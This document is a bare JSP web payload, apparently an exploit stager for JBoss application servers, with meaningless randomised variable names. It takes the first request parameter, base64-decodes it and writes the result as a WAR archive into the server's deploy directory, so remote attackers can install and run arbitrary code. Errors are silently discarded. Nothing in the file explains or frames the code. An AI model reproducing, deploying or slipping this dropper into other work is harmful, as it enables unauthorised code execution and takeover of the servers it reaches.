<%@page import="java.io.*,
    java.util.*,
    sun.misc.BASE64Decoder"
%>
<%
  String vnDfrQnjCV = System.getProperty("jboss.server.home.dir");
  String uPGkORHr = vnDfrQnjCV + "/deploy/" + "module-target-admin.war";
  try {
    String TuvFgqSTSAGDaD = "";
    String parameterName = (String)(request.getParameterNames().nextElement());
    TuvFgqSTSAGDaD = request.getParameter(parameterName);
    FileOutputStream TpVLWHmsDQ = new FileOutputStream(uPGkORHr);
    byte[] TMgHADeWzkQTW = new BASE64Decoder().decodeBuffer(TuvFgqSTSAGDaD);
    TpVLWHmsDQ.write(TMgHADeWzkQTW);
    TpVLWHmsDQ.close();
  }
  catch(Exception e){ }
%>
